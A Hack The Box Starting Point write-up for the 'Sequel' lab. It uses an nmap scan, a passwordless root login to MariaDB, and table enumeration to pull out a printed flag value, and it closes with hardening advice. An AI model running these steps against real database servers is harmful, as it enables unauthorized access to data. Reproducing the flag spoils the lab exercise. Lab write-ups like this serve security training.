# Sequel

**Platform:** Hack The Box — Starting Point Tier 1  
**Difficulty:** Very Easy  
**OS:** Linux  
**Tags:** `MySQL` `MariaDB` `Misconfiguration` `Database Enumeration`

---

## Summary

Máquina de introducción a bases de datos MySQL/MariaDB. El servicio está mal configurado permitiendo acceso como `root` sin contraseña. Una vez dentro, se enumeran las bases de datos y tablas hasta encontrar el flag en texto plano.

---

## Reconocimiento

```bash
nmap -sC -sV <TARGET_IP>
```

**Resultado relevante:**
```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB (unauthorized)
```

Solo un puerto abierto. Puerto 3306 = MySQL/MariaDB.

---

## Exploitation

### Acceso sin contraseña como root

```bash
mysql -h <TARGET_IP> -u root
```

No pide contraseña. Entramos directamente a la consola de MariaDB.

### Enumeración de bases de datos

```sql
SHOW databases;
```

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Explorar la base de datos `htb`

```sql
USE htb;
SHOW tables;
```

```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Extraer el flag

```sql
SELECT * FROM config;
```

```
+----+------+----------------------------------+
| id | name | value                            |
+----+------+----------------------------------+
|  1 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+----+------+----------------------------------+
```

---

## Flag

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## Key Takeaways

- Nunca exponer MySQL/MariaDB a la red sin autenticación, especialmente como `root`
- El puerto 3306 accesible externamente ya es una señal de alarma crítica
- Flujo básico de enumeración SQL: `SHOW databases` → `USE <db>` → `SHOW tables` → `SELECT * FROM <table>`